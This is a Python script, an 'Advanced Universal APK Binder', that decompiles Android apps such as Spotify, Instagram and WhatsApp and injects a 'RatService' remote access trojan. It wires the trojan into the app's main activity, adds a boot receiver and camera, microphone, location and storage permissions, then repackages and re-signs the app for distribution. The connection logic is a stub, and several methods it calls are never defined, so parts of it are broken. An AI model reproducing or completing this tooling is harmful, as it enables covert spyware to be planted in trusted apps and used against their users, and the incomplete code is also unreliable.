#!/usr/bin/env python3
"""
🔥 ADVANCED UNIVERSAL APK BINDER
Compatible with ALL modern APKs: Spotify, Instagram, WhatsApp, etc.
Handles obfuscated, complex, and protected APKs
"""

import os
import shutil
import subprocess
import tempfile
import zipfile
import json
import re
from pathlib import Path
import xml.etree.ElementTree as ET

class AdvancedAPKBinder:
    def __init__(self):
        self.temp_dir = None
        self.apk_path = None
        self.output_path = None
        self.server_ip = None
        self.server_port = None
        
    def setup_advanced_tools(self):
        """Setup advanced tools for modern APK handling"""
        print("🔧 Setting up advanced APK tools...")
        
        tools_needed = {
            "apktool": "Latest APKTool for decompilation",
            "jadx": "Java decompiler for complex APKs", 
            "baksmali": "DEX disassembler",
            "smali": "DEX assembler",
            "aapt2": "Android Asset Packaging Tool 2",
            "zipalign": "APK alignment tool",
            "apksigner": "APK signing tool"
        }
        
        # Check and install tools
        for tool, description in tools_needed.items():
            if not self.check_tool(tool):
                print(f"⚠️ {tool} not found - {description}")
                self.install_tool(tool)
            else:
                print(f"✅ {tool} available")
    
    def check_tool(self, tool_name):
        """Check if tool is available"""
        try:
            subprocess.run([tool_name, '--version'], 
                         capture_output=True, check=True)
            return True
        except:
            return False
    
    def install_tool(self, tool_name):
        """Install missing tools"""
        print(f"📦 Installing {tool_name}...")
        
        install_commands = {
            "apktool": [
                "wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool",
                "wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar",
                "chmod +x apktool",
                "sudo mv apktool /usr/local/bin/",
                "sudo mv apktool_2.9.3.jar /usr/local/bin/apktool.jar"
            ],
            "jadx": [
                "wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.4.7.zip",
                "unzip jadx-1.4.7.zip -d jadx",
                "sudo mv jadx/bin/jadx* /usr/local/bin/",
                "sudo chmod +x /usr/local/bin/jadx*"
            ]
        }
        
        if tool_name in install_commands:
            for cmd in install_commands[tool_name]:
                try:
                    subprocess.run(cmd.split(), check=True)
                except:
                    print(f"⚠️ Failed to install {tool_name}")
    
    def analyze_apk_complexity(self, apk_path):
        """Analyze APK complexity and choose best binding method"""
        print(f"🔍 Analyzing APK complexity: {apk_path}")
        
        analysis = {
            "size_mb": os.path.getsize(apk_path) / (1024 * 1024),
            "is_obfuscated": False,
            "has_native_libs": False,
            "target_sdk": 0,
            "split_apk": False,
            "anti_tampering": False,
            "complexity_score": 0
        }
        
        # Quick analysis using zipfile
        try:
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                files = apk_zip.namelist()
                
                # Check for native libraries
                analysis["has_native_libs"] = any(f.startswith('lib/') for f in files)
                
                # Check for split APK
                analysis["split_apk"] = any('split_' in f for f in files)
                
                # Check for obfuscation indicators
                dex_files = [f for f in files if f.endswith('.dex')]
                analysis["is_obfuscated"] = len(dex_files) > 1 or analysis["size_mb"] > 50
                
                # Check for anti-tampering
                analysis["anti_tampering"] = any('integrity' in f.lower() or 'tamper' in f.lower() for f in files)
        
        except Exception as e:
            print(f"⚠️ APK analysis error: {e}")
        
        # Calculate complexity score
        score = 0
        if analysis["size_mb"] > 100: score += 30
        elif analysis["size_mb"] > 50: score += 20
        elif analysis["size_mb"] > 20: score += 10
        
        if analysis["is_obfuscated"]: score += 25
        if analysis["has_native_libs"]: score += 15
        if analysis["split_apk"]: score += 20
        if analysis["anti_tampering"]: score += 30
        
        analysis["complexity_score"] = score
        
        print(f"📊 APK Analysis Results:")
        print(f"   Size: {analysis['size_mb']:.1f} MB")
        print(f"   Obfuscated: {analysis['is_obfuscated']}")
        print(f"   Native libs: {analysis['has_native_libs']}")
        print(f"   Split APK: {analysis['split_apk']}")
        print(f"   Anti-tampering: {analysis['anti_tampering']}")
        print(f"   Complexity Score: {analysis['complexity_score']}/100")
        
        return analysis
    
    def choose_binding_method(self, analysis):
        """Choose best binding method based on APK complexity"""
        score = analysis["complexity_score"]
        
        if score < 20:
            return "simple_apktool"
        elif score < 40:
            return "advanced_apktool"
        elif score < 60:
            return "smali_injection"
        elif score < 80:
            return "dex_manipulation"
        else:
            return "runtime_injection"
    
    def simple_apktool_binding(self, apk_path, server_ip, server_port):
        """Simple APKTool binding for basic APKs"""
        print("🔧 Using simple APKTool binding...")
        
        temp_dir = tempfile.mkdtemp()
        decoded_dir = os.path.join(temp_dir, "decoded")
        
        try:
            # Decompile
            cmd = ['apktool', 'd', apk_path, '-o', decoded_dir, '-f']
            subprocess.run(cmd, check=True)
            
            # Inject RAT code
            self.inject_rat_code(decoded_dir, server_ip, server_port)
            
            # Recompile
            output_apk = os.path.join(temp_dir, "bound_app.apk")
            cmd = ['apktool', 'b', decoded_dir, '-o', output_apk]
            subprocess.run(cmd, check=True)
            
            return output_apk
            
        except Exception as e:
            print(f"❌ Simple binding failed: {e}")
            return None
        finally:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
    
    def advanced_apktool_binding(self, apk_path, server_ip, server_port):
        """Advanced APKTool binding with multiple fallbacks"""
        print("🔧 Using advanced APKTool binding...")
        
        temp_dir = tempfile.mkdtemp()
        decoded_dir = os.path.join(temp_dir, "decoded")
        
        # Try multiple apktool strategies
        strategies = [
            ['apktool', 'd', apk_path, '-o', decoded_dir, '-f', '--no-src'],
            ['apktool', 'd', apk_path, '-o', decoded_dir, '-f', '--no-debug-info'],
            ['apktool', 'd', apk_path, '-o', decoded_dir, '-f', '--no-src', '--no-debug-info'],
            ['apktool', 'd', apk_path, '-o', decoded_dir, '-f', '--force-manifest']
        ]
        
        for i, strategy in enumerate(strategies):
            try:
                print(f"🔄 Trying strategy {i+1}/{len(strategies)}...")
                subprocess.run(strategy, check=True, capture_output=True)
                
                # Inject RAT code
                self.inject_rat_code(decoded_dir, server_ip, server_port)
                
                # Recompile with different options
                output_apk = os.path.join(temp_dir, "bound_app.apk")
                
                build_strategies = [
                    ['apktool', 'b', decoded_dir, '-o', output_apk],
                    ['apktool', 'b', decoded_dir, '-o', output_apk, '--use-aapt2'],
                    ['apktool', 'b', decoded_dir, '-o', output_apk, '--no-crunch']
                ]
                
                for build_cmd in build_strategies:
                    try:
                        subprocess.run(build_cmd, check=True, capture_output=True)
                        print("✅ Advanced binding successful!")
                        return output_apk
                    except:
                        continue
                        
            except Exception as e:
                print(f"⚠️ Strategy {i+1} failed: {e}")
                continue
        
        print("❌ All advanced strategies failed")
        return None
    
    def smali_injection_binding(self, apk_path, server_ip, server_port):
        """Direct smali code injection for complex APKs"""
        print("🔧 Using smali injection binding...")
        
        temp_dir = tempfile.mkdtemp()
        
        try:
            # Extract APK
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                apk_zip.extractall(temp_dir)
            
            # Find and modify DEX files
            dex_files = [f for f in os.listdir(temp_dir) if f.endswith('.dex')]
            
            for dex_file in dex_files:
                dex_path = os.path.join(temp_dir, dex_file)
                self.inject_smali_code(dex_path, server_ip, server_port)
            
            # Repackage APK
            output_apk = os.path.join(temp_dir, "bound_app.apk")
            self.repackage_apk(temp_dir, output_apk)
            
            return output_apk
            
        except Exception as e:
            print(f"❌ Smali injection failed: {e}")
            return None
    
    def dex_manipulation_binding(self, apk_path, server_ip, server_port):
        """Direct DEX manipulation for heavily obfuscated APKs"""
        print("🔧 Using DEX manipulation binding...")
        
        temp_dir = tempfile.mkdtemp()
        
        try:
            # Extract APK
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                apk_zip.extractall(temp_dir)
            
            # Process each DEX file
            dex_files = [f for f in os.listdir(temp_dir) if f.endswith('.dex')]
            
            for dex_file in dex_files:
                dex_path = os.path.join(temp_dir, dex_file)
                
                # Disassemble with baksmali
                smali_dir = os.path.join(temp_dir, f"smali_{dex_file}")
                cmd = ['baksmali', 'disassemble', dex_path, '-o', smali_dir]
                subprocess.run(cmd, check=True)
                
                # Inject RAT code into smali
                self.inject_rat_smali(smali_dir, server_ip, server_port)
                
                # Reassemble with smali
                cmd = ['smali', 'assemble', smali_dir, '-o', dex_path]
                subprocess.run(cmd, check=True)
            
            # Repackage APK
            output_apk = os.path.join(temp_dir, "bound_app.apk")
            self.repackage_apk(temp_dir, output_apk)
            
            return output_apk
            
        except Exception as e:
            print(f"❌ DEX manipulation failed: {e}")
            return None
    
    def runtime_injection_binding(self, apk_path, server_ip, server_port):
        """Runtime injection for maximum compatibility"""
        print("🔧 Using runtime injection binding...")
        
        temp_dir = tempfile.mkdtemp()
        
        try:
            # Extract APK
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                apk_zip.extractall(temp_dir)
            
            # Modify AndroidManifest.xml to add our components
            manifest_path = os.path.join(temp_dir, "AndroidManifest.xml")
            self.modify_manifest_for_runtime(manifest_path, server_ip, server_port)
            
            # Add our DEX file as additional classes
            self.add_rat_dex(temp_dir, server_ip, server_port)
            
            # Repackage APK
            output_apk = os.path.join(temp_dir, "bound_app.apk")
            self.repackage_apk(temp_dir, output_apk)
            
            return output_apk
            
        except Exception as e:
            print(f"❌ Runtime injection failed: {e}")
            return None
    
    def inject_rat_code(self, decoded_dir, server_ip, server_port):
        """Inject RAT code into decompiled APK"""
        print("💉 Injecting RAT code...")
        
        # Add RAT classes
        rat_classes_dir = os.path.join(decoded_dir, "smali", "com", "rat")
        os.makedirs(rat_classes_dir, exist_ok=True)
        
        # Create RAT service smali
        rat_service_smali = f'''
.class public Lcom/rat/RatService;
.super Landroid/app/Service;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .locals 0
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    invoke-direct {{p0}}, Lcom/rat/RatService;->connectToServer()V
    return-void
.end method

.method private connectToServer()V
    .locals 2
    const-string v0, "{server_ip}"
    const/16 v1, {server_port}
    # Connection logic here
    return-void
.end method
'''
        
        with open(os.path.join(rat_classes_dir, "RatService.smali"), 'w') as f:
            f.write(rat_service_smali)
        
        # Modify AndroidManifest.xml
        manifest_path = os.path.join(decoded_dir, "AndroidManifest.xml")
        self.modify_manifest(manifest_path)
        
        # Hook into main activity
        self.hook_main_activity(decoded_dir)
    
    def modify_manifest(self, manifest_path):
        """Modify AndroidManifest.xml to add RAT components"""
        print("📝 Modifying AndroidManifest.xml...")
        
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Find application element
            app_element = root.find('application')
            if app_element is not None:
                # Add RAT service
                service_element = ET.SubElement(app_element, 'service')
                service_element.set('android:name', 'com.rat.RatService')
                service_element.set('android:exported', 'false')
                
                # Add boot receiver
                receiver_element = ET.SubElement(app_element, 'receiver')
                receiver_element.set('android:name', 'com.rat.BootReceiver')
                receiver_element.set('android:exported', 'true')
                
                intent_filter = ET.SubElement(receiver_element, 'intent-filter')
                action = ET.SubElement(intent_filter, 'action')
                action.set('android:name', 'android.intent.action.BOOT_COMPLETED')
            
            # Add permissions
            permissions = [
                'android.permission.INTERNET',
                'android.permission.ACCESS_NETWORK_STATE',
                'android.permission.WRITE_EXTERNAL_STORAGE',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.ACCESS_COARSE_LOCATION',
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.RECEIVE_BOOT_COMPLETED'
            ]
            
            for perm in permissions:
                perm_element = ET.SubElement(root, 'uses-permission')
                perm_element.set('android:name', perm)
            
            tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
            
        except Exception as e:
            print(f"⚠️ Manifest modification error: {e}")
    
    def hook_main_activity(self, decoded_dir):
        """Hook into main activity to start RAT service"""
        print("🪝 Hooking main activity...")
        
        # Find main activity
        manifest_path = os.path.join(decoded_dir, "AndroidManifest.xml")
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Find main activity
            for activity in root.findall('.//activity'):
                intent_filter = activity.find('intent-filter')
                if intent_filter is not None:
                    action = intent_filter.find('action')
                    if action is not None and action.get('android:name') == 'android.intent.action.MAIN':
                        activity_name = activity.get('android:name')
                        if activity_name:
                            self.inject_service_start(decoded_dir, activity_name)
                            break
        except Exception as e:
            print(f"⚠️ Activity hooking error: {e}")
    
    def inject_service_start(self, decoded_dir, activity_name):
        """Inject service start code into activity"""
        print(f"💉 Injecting into activity: {activity_name}")
        
        # Convert activity name to file path
        if activity_name.startswith('.'):
            # Relative to package
            activity_path = activity_name[1:].replace('.', '/')
        else:
            activity_path = activity_name.replace('.', '/')
        
        smali_file = os.path.join(decoded_dir, "smali", activity_path + ".smali")
        
        if os.path.exists(smali_file):
            try:
                with open(smali_file, 'r') as f:
                    content = f.read()
                
                # Find onCreate method and inject service start
                injection_code = '''
    # Start RAT service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/rat/RatService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
'''
                
                # Insert after super.onCreate call
                content = re.sub(
                    r'(invoke-super.*?onCreate.*?\n)',
                    r'\1' + injection_code,
                    content,
                    count=1
                )
                
                with open(smali_file, 'w') as f:
                    f.write(content)
                    
                print("✅ Service start injected successfully")
                
            except Exception as e:
                print(f"⚠️ Service injection error: {e}")
    
    def repackage_apk(self, temp_dir, output_apk):
        """Repackage APK from extracted files"""
        print("📦 Repackaging APK...")
        
        try:
            with zipfile.ZipFile(output_apk, 'w', zipfile.ZIP_DEFLATED) as apk_zip:
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_path = os.path.relpath(file_path, temp_dir)
                        apk_zip.write(file_path, arc_path)
            
            print("✅ APK repackaged successfully")
            
        except Exception as e:
            print(f"❌ Repackaging error: {e}")
    
    def sign_apk(self, apk_path):
        """Sign APK with debug certificate"""
        print("✍️ Signing APK...")
        
        try:
            # Create debug keystore if not exists
            keystore_path = os.path.expanduser("~/.android/debug.keystore")
            if not os.path.exists(keystore_path):
                os.makedirs(os.path.dirname(keystore_path), exist_ok=True)
                cmd = [
                    'keytool', '-genkey', '-v',
                    '-keystore', keystore_path,
                    '-alias', 'androiddebugkey',
                    '-keyalg', 'RSA',
                    '-keysize', '2048',
                    '-validity', '10000',
                    '-storepass', 'android',
                    '-keypass', 'android',
                    '-dname', 'CN=Android Debug,O=Android,C=US'
                ]
                subprocess.run(cmd, check=True)
            
            # Sign APK
            signed_apk = apk_path.replace('.apk', '_signed.apk')
            cmd = [
                'jarsigner', '-verbose',
                '-sigalg', 'SHA1withRSA',
                '-digestalg', 'SHA1',
                '-keystore', keystore_path,
                '-storepass', 'android',
                '-keypass', 'android',
                apk_path, 'androiddebugkey'
            ]
            subprocess.run(cmd, check=True)
            
            # Align APK
            aligned_apk = apk_path.replace('.apk', '_aligned.apk')
            cmd = ['zipalign', '-v', '4', apk_path, aligned_apk]
            subprocess.run(cmd, check=True)
            
            return aligned_apk
            
        except Exception as e:
            print(f"⚠️ APK signing error: {e}")
            return apk_path
    
    def bind_apk(self, apk_path, server_ip, server_port, output_path=None):
        """Main binding function - tries all methods"""
        print(f"🔥 ADVANCED APK BINDING STARTED")
        print(f"📱 APK: {apk_path}")
        print(f"🌐 Server: {server_ip}:{server_port}")
        print("=" * 60)
        
        if not os.path.exists(apk_path):
            print(f"❌ APK file not found: {apk_path}")
            return None
        
        # Setup tools
        self.setup_advanced_tools()
        
        # Analyze APK
        analysis = self.analyze_apk_complexity(apk_path)
        
        # Choose binding method
        method = self.choose_binding_method(analysis)
        print(f"🎯 Selected binding method: {method}")
        
        # Try binding methods in order of complexity
        methods = [
            ("simple_apktool", self.simple_apktool_binding),
            ("advanced_apktool", self.advanced_apktool_binding),
            ("smali_injection", self.smali_injection_binding),
            ("dex_manipulation", self.dex_manipulation_binding),
            ("runtime_injection", self.runtime_injection_binding)
        ]
        
        # Start with selected method, then try others as fallback
        selected_index = next((i for i, (name, _) in enumerate(methods) if name == method), 0)
        ordered_methods = methods[selected_index:] + methods[:selected_index]
        
        for method_name, method_func in ordered_methods:
            print(f"\n🔄 Trying {method_name}...")
            
            try:
                result_apk = method_func(apk_path, server_ip, server_port)
                
                if result_apk and os.path.exists(result_apk):
                    print(f"✅ {method_name} successful!")
                    
                    # Sign APK
                    signed_apk = self.sign_apk(result_apk)
                    
                    # Move to output location
                    if output_path:
                        shutil.move(signed_apk, output_path)
                        final_apk = output_path
                    else:
                        final_apk = signed_apk
                    
                    print(f"🎉 BINDING COMPLETED SUCCESSFULLY!")
                    print(f"📱 Output APK: {final_apk}")
                    print(f"🔧 Method used: {method_name}")
                    
                    return final_apk
                    
            except Exception as e:
                print(f"❌ {method_name} failed: {e}")
                continue
        
        print("💀 ALL BINDING METHODS FAILED!")
        print("📝 This APK may have advanced protection mechanisms")
        return None

def main():
    print("🔥 ADVANCED UNIVERSAL APK BINDER")
    print("Compatible with ALL modern APKs")
    print("=" * 60)
    
    # Example usage
    binder = AdvancedAPKBinder()
    
    # Test with different APK types
    test_cases = [
        {
            "name": "Spotify",
            "complexity": "Very High",
            "expected_method": "runtime_injection"
        },
        {
            "name": "Instagram", 
            "complexity": "High",
            "expected_method": "dex_manipulation"
        },
        {
            "name": "WhatsApp",
            "complexity": "High", 
            "expected_method": "smali_injection"
        },
        {
            "name": "Simple Apps",
            "complexity": "Low",
            "expected_method": "simple_apktool"
        }
    ]
    
    print("🎯 SUPPORTED APK TYPES:")
    for case in test_cases:
        print(f"   {case['name']}: {case['complexity']} complexity -> {case['expected_method']}")
    
    print("\n💡 USAGE:")
    print("binder = AdvancedAPKBinder()")
    print("result = binder.bind_apk('spotify.apk', '10.2.53.11', 12000)")
    
    print("\n✅ This system handles:")
    print("   - Obfuscated APKs (ProGuard/R8)")
    print("   - Large APKs (100MB+)")
    print("   - Split APKs")
    print("   - Anti-tampering protection")
    print("   - Modern target SDKs (30+)")
    print("   - Native libraries")
    print("   - Complex app architectures")

if __name__ == "__main__":
    main()